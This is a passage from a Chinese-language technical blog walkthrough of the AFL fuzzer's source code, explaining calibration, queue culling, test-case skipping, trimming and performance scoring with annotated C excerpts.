&amp;&amp; !stage_cur &amp;&amp; !<span class="built_in">count_bytes</span>(trace_bits)) &#123;</span><br><span class="line">      fault = FAULT_NOINST;</span><br><span class="line">      <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;</span><br><span class="line"></span><br><span class="line">      u8 hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">      <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        u32 i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">            var_bytes[i] = <span class="number">1</span>;</span><br><span class="line">            stage_max    = CAL_CYCLES_LONG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var_detected = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        q-&gt;exec_cksum = cksum;</span><br><span class="line">        <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line">  total_cal_us     += stop_us - start_us;</span><br><span class="line">  total_cal_cycles += stage_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* OK, let&#x27;s collect some stats about the performance of this test case.</span></span><br><span class="line"><span class="comment">     This is used for fuzzing air time calculations in calculate_score(). */</span></span><br><span class="line"></span><br><span class="line">  q-&gt;exec_us     = (stop_us - start_us) / stage_max;</span><br><span class="line">  q-&gt;bitmap_size = <span class="built_in">count_bytes</span>(trace_bits);</span><br><span class="line">  q-&gt;handicap    = handicap;</span><br><span class="line">  q-&gt;cal_failed  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">  total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">update_bitmap_score</span>(q);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If this case didn&#x27;t result in new output from the instrumentation, tell</span></span><br><span class="line"><span class="comment">     parent. This is a non-critical problem, but something to warn the user</span></span><br><span class="line"><span class="comment">     about. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault = FAULT_NOBITS;</span><br><span class="line"></span><br><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_bits == <span class="number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">    q-&gt;has_new_cov = <span class="number">1</span>;</span><br><span class="line">    queued_with_cov++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark variable paths. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (var_detected) &#123;</span><br><span class="line"></span><br><span class="line">    var_byte_count = <span class="built_in">count_bytes</span>(var_bytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!q-&gt;var_behavior) &#123;</span><br><span class="line">      <span class="built_in">mark_as_variable</span>(q);</span><br><span class="line">      queued_variable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_name = old_sn;</span><br><span class="line">  stage_cur  = old_sc;</span><br><span class="line">  stage_max  = old_sm;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!first_run) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fault;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里会首先调用<code>init_forkserver</code> 函数来确保forkserver已经开启，至于这里的<code>forkserver</code> 是什么这里还没有分析。</p><p>如果这里不是第一次运行的话，那么就将<code>trace_bits</code> 拷贝到<code>first_trace</code> 的内存空间中。<br>之后会执行一个for循环，也就是对测试用例的校准执行的不只一次。最大执行的次数为<code>stage_max</code></p><p>之后会调用<code>write_to_testcase</code> 函数将测试用例的内容写入到测试文件中，这里写入的内容<code>use_mem</code> 其实就是函数调用之前读取的队列中的测试用例的内容。这里写入的测试文件是通过<code>out_file</code> 这个变量进行控制的。</p><p>之后就会调用<code>run_target</code> 函数启动目标程序执行测试用例。这里启动的方式有两种</p><ol><li>如果处于dump mode，或者forkserver没有开启的话，那么这里由此函数所在的线程fork启动目标程序执行测试用例。</li><li>如果forkserver开启，那么这里只需要给forkserver发送消息，由forkserver fork产生一个新的进程及启动目标程序。当前进程和forkserver之间采用pipe管道进行通信</li></ol><p>执行Fuzz过程中的路径信息会保存在<code>trace_bits</code> 中。在执行结束之后会对<code>trace_bits</code> 的内存空间做一个<code>hash32</code> ，也就是会去判断在本次执行过程中有没有产生新的路径，这里之前路径的hash信息保存在<code>q-&gt;exec_cksum</code> 中。这里如果在执行过程中产生了新的路径，那么这里会首先调用<code>has_new_bits</code> 函数，函数这里会去判断当前的路径信息和之前的路径信息<code>virgin_bits</code> 是否产生了不同，如果产生了变化的话就会更新<code>virgin_bits</code> 的信息。注意到这里产生新路径的判断方式即现在的bit位不是0，但是之前的bits位0xff（这里表示的是之前的bit位是0，也就是不存在这样的元组）那么这里就产生了新的路径</p><blockquote><p>这里需要提前了解一下路径信息的存储方式，这里实际上在白皮书上讲到过，也就是对于A→B这样的路径来说，这里存储的是<code>shared_mem[(A&gt;&gt;1)^B]++</code> ，也就是存在路径之后相应的bits位就肯定不是0了。</p></blockquote><p>那么就会分为以下两种情况进行处理</p><ol><li>如果<code>q-&gt;exec_cksum</code> 为空，也就是第一次运行这个测试用例，那么就更新<code>q-&gt;exec_cksum</code> 以及将<code>trace_bits</code> 拷贝到<code>first_trace</code> 中</li><li>如果不为空，那么确实产生了新的路径信息。那么这里就会将测试的论述调大即设置<code>stage_max</code> 的值为<code>CAL_CYCLES_LONG</code></li></ol><p>当当前的测试用例的<code>stage_max</code> 轮测试都跑完之后，即调用<code>update_bitmap_score</code> 函数来计算当前测试用例的分数。</p><p>如果产生了新的路径，那么标记这个测试用例为<code>variable</code> ，测试之后的结果如果<code>new_bits</code> 那么就表示有新路径产生。</p><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><p>该函数是样本选择的重要函数，也是AFL中优胜者策略的重要组成部分，我们看一下这个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The second part of the mechanism discussed above is a routine that</span></span><br><span class="line"><span class="comment">   goes over top_rated[] entries, and then sequentially grabs winners for</span></span><br><span class="line"><span class="comment">   previously-unseen bytes (temp_v) and marks them as favored, at least</span></span><br><span class="line"><span class="comment">   until the next run. The favored entries are given more air time during</span></span><br><span class="line"><span class="comment">   all fuzzing steps. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">cull_queue</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q;</span><br><span class="line">  <span class="type">static</span> u8 temp_v[MAP_SIZE &gt;&gt; <span class="number">3</span>];</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode || !score_changed) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  score_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  queued_favored  = <span class="number">0</span>;</span><br><span class="line">  pending_favored = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  q = queue;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    q-&gt;favored = <span class="number">0</span>;</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s see if anything in the bitmap isn&#x27;t captured in temp_v.</span></span><br><span class="line"><span class="comment">     If yes, and if it has a top_rated[] contender, let&#x27;s use it. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">    <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line"></span><br><span class="line">      u32 j = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Remove all bits belonging to the current entry from temp_v. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (j--) </span><br><span class="line">        <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])</span><br><span class="line">          temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line"></span><br><span class="line">      top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">      queued_favored++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!top_rated[i]-&gt;was_fuzzed) pending_favored++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  q = queue;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    <span class="built_in">mark_as_redundant</span>(q, !q-&gt;favored);</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先初始化了队列，将每个测试用例的<code>favored</code> 成员变量置为0。接着遍历整个路径元组，对于每一个路径，这里AFL认为第一次遍历得到的优胜者测试用例是更加受欢迎的，也就是<code>favored</code> 。在<code>update_bitmap_score</code>中我们可以知道这里<code>trace_mini</code> 数组中是用1bit包含了路径有没有被命中的信息。那么这里<code>temp_v</code> 表示的就是当前测试用例没有被命中的路径数组的信息。也就是说这里永远会选择第一个遍历得到的优胜者测试用例。将其<code>favored</code> 成员变量设置为1。对于受欢迎的优胜者测试用例，如果没有被Fuzz过，那么这里将会通过<code>pending_favored</code>计算此类的测试用例的数量，以便在之后优先Fuzz。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Mark / unmark as redundant (edge-only). This is not used for restoring state,</span></span><br><span class="line"><span class="comment">   but may be useful for post-processing datasets. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">mark_as_redundant</span><span class="params">(<span class="keyword">struct</span> queue_entry* q, u8 state)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* fn;</span><br><span class="line">  s32 fd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (state == q-&gt;fs_redundant) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  q-&gt;fs_redundant = state;</span><br><span class="line"></span><br><span class="line">  fn = <span class="built_in">strrchr</span>(q-&gt;fname, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue/.state/redundant_edges/%s&quot;</span>, out_dir, fn + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (state) &#123;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">unlink</span>(fn)) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to remove &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的分析中我们实际上可以看到并不是所有的优胜者测试用例都是受欢迎的，对于不太受欢迎的优胜者测试用例，那么这里会调用<code>mark_as_redundant</code> 函数将其放入到<code>queue/.state/redundant_edges</code> 文件夹下面，同理，如果被重新欢迎了，那么就将其从这个路径中删除。</p><h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h2><p>前面我们说到在第一次Fuzz也就是Dry Run执行完毕之后，即进入到了Main Loop中，每一次循环都会首先执行<code>cull_queue</code> 进行队列的精简，然后调用<code>fuzz_one</code> 函数开始本次的Fuzz。我们来看一下<code>fuzz_one</code>函数，这个函数非常的长，大概有2k行代码。这里如果Fuzz执行成功之后即返回0，如果跳过当前的测试用例或者Fuzz执行失败那么这里返回1。</p><h3 id="按照策略跳过某些测试用例"><a href="#按照策略跳过某些测试用例" class="headerlink" title="按照策略跳过某些测试用例"></a>按照策略跳过某些测试用例</h3><p>这里首先会按照一定的概率跳过一些测试用例，这里代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pending_favored) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have any favored, non-fuzzed new arrivals in the queue,</span></span><br><span class="line"><span class="comment">     possibly skip to them at the expense of already-fuzzed or non-favored</span></span><br><span class="line"><span class="comment">     cases. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">      <span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 这里UR的宏定义实际上就是产生一个随机数</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Otherwise, still possibly skip non-favored cases, albeit less often.</span></span><br><span class="line"><span class="comment">     The odds of skipping stuff are higher for already-fuzzed inputs and</span></span><br><span class="line"><span class="comment">     lower for never-fuzzed entries. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 75%</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 95%</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果<code>pending_favored</code> 的值大于0，也就是队列中存在受欢迎的优胜者测试用例还没有被Fuzz过。那么这里如果当前的测试用例已经被fuzz过了或者当前的测试用例不是受欢迎的优胜者，那么这里将会存在99%的概率跳过这个测试用例。</p><p>如果队列中所有的受欢迎的优胜者测试用例都被Fuzz过了，那么这里对于队列中的不感兴趣的测试用例，如果当前的测试用例没有被fuzz过，那么将会存在75%的概率跳过这个测试用例；否则以95%的概率跳过这个测试用例。</p><h3 id="剪枝"><a href="#剪枝" class="headerlink" title="剪枝"></a>剪枝</h3><p>接着来要干的事情就是将测试用例读取到内存中。这里实际上是分配了两个内存空间，也就是in_buf/origin_in以及out_buf，其中in_buf/origin_in则是将测试用例以文件映射的方式mmap到了一个地址空间中。而out_buf则是按照文件的大小申请了相应大小的内存。</p><p>接下来对之前我们调用<code>calibrate_case</code> 函数对测试用例的校准结果进行了判断，如果校准的失败次数小于<code>CAL_CHANCES</code> 也就是3次，那么这里将会重新调用<code>calibrate_case</code> 进行校准。</p><p>接下来即进行剪枝的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************</span></span><br><span class="line"><span class="comment"> * TRIMMING *</span></span><br><span class="line"><span class="comment"> ************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123; <span class="comment">// dumb_mode表示不再进行插桩</span></span><br><span class="line"></span><br><span class="line">  u8 res = <span class="built_in">trim_case</span>(argv, queue_cur, in_buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">    cur_skipped_paths++;</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don&#x27;t retry trimming, even if it failed. */</span></span><br><span class="line"></span><br><span class="line">  queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (len != queue_cur-&gt;len) len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br></pre></td></tr></table></figure><p>也就是这里如果当前的测试用例没有被剪枝过的话，那么这里将会调用<code>trim_case</code> 函数进行剪枝的操作。注意到的是这里必须要在插桩模式下才会执行剪枝的操作。</p><p>剪枝结束之后，这里将当前的测试用例写会到磁盘中，然后更新其对应的<code>trace_bits</code> 和<code>top_rated</code>数组。剪枝结束之后更新out_buf的内容为新的in_buf的内容。</p><h3 id="打分"><a href="#打分" class="headerlink" title="打分"></a>打分</h3><p>剪枝结束之后对当前的测试用例调用<code>calculate_score</code> 函数进行打分。这一部分的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment"> * PERFORMANCE SCORE *</span></span><br><span class="line"><span class="comment"> *********************/</span></span><br><span class="line"></span><br><span class="line">orig_perf = perf_score = <span class="built_in">calculate_score</span>(queue_cur);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Skip right away if -d is given, if we have done deterministic fuzzing on</span></span><br><span class="line"><span class="comment">   this entry ourselves (was_fuzzed), or if it has gone through deterministic</span></span><br><span class="line"><span class="comment">   testing in earlier, resumed runs (passed_det). */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">  <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span></span><br><span class="line"><span class="comment">   for this master instance. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">doing_det = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>这里如果在启动参数中设置了跳过确定性变异，或者当前的测试用例已经被fuzz过了或者说测试用例被标记了要跳过当前测试用例的确定性变异的过程的话，那么这里就会跳过确定性变异的过程进入到随机变异的过程中。这里我们看一下<code>calculate_score</code> 函数</p><ul><li>calculate_score函数内容  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Calculate case desirability score to adjust the length of havoc fuzzing.</span></span><br><span class="line"><span class="comment">   A helper function for fuzz_one(). Maybe some of these constants should</span></span><br><span class="line"><span class="comment">   go into config.h. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> u32 <span class="title">calculate_score</span><span class="params">(<span class="keyword">struct</span> queue_entry* q)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 avg_exec_us = total_cal_us / total_cal_cycles;</span><br><span class="line">  u32 avg_bitmap_size = total_bitmap_size / total_bitmap_entries;</span><br><span class="line">  u32 perf_score = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Adjust score based on execution speed of this path, compared to the</span></span><br><span class="line"><span class="comment">     global average. Multiplier ranges from 0.1x to 3x. Fast inputs are</span></span><br><span class="line"><span class="comment">     less expensive to fuzz, so we&#x27;re giving them more air time. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.1</span> &gt; avg_exec_us) perf_score = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.25</span> &gt; avg_exec_us) perf_score = <span class="number">25</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.5</span> &gt; avg_exec_us) perf_score = <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.75</span> &gt; avg_exec_us) perf_score = <span class="number">75</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">4</span> &lt; avg_exec_us) perf_score = <span class="number">300</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">3</span> &lt; avg_exec_us) perf_score = <span class="number">200</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">2</span> &lt; avg_exec_us) perf_score = <span class="number">150</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Adjust score based on bitmap size. The working theory is that better</span></span><br><span class="line"><span class="comment">     coverage translates to better targets. Multiplier from 0.25x to 3x. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.3</span> &gt; avg_bitmap_size) perf_score *= <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.5</span> &gt; avg_bitmap_size) perf_score *= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.75</span> &gt; avg_bitmap_size) perf_score *= <span class="number">1.5</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">3</span> &lt; avg_bitmap_size) perf_score *= <span class="number">0.25</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">2</span> &lt; avg_bitmap_size) perf_score *= <span class="number">0.5</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">1.5</span> &lt; avg_bitmap_size) perf_score *= <span class="number">0.75</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Adjust score based on handicap. Handicap is proportional to how late</span></span><br><span class="line"><span class="comment">     in the game we learned about this path. Latecomers are allowed to run</span></span><br><span class="line"><span class="comment">     for a bit longer until they catch up with the rest. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> 